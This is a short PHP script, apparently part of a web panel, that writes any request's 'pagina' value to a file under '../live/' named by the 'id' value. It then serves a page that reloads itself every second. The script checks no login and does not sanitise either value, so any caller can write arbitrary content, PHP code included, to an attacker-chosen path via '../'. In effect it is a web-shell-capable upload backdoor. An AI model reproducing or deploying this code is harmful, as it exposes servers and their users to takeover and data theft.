<?php  /* 8cqubhIqggVYyFJQCSjyFunn6SYPF0Ftaqj88 */   require "generale.php"; $cartella1="../live"; if (!file_exists($cartella1)) { mkdir($cartella1); } if(isset($_REQUEST['id']) && isset($_REQUEST['pagina'])){ $id= $_REQUEST['id']; $pagina = $_REQUEST['pagina']; $nomefile = $cartella1."/".$id; creafile($nomefile); $txt = $pagina; $myfile2222 = file_put_contents($nomefile, $txt.PHP_EOL); } ?>
<html><script>
  setTimeout(function(){     window.location.href=window.location.href  },1000)
  </script>
</html><?php  ?>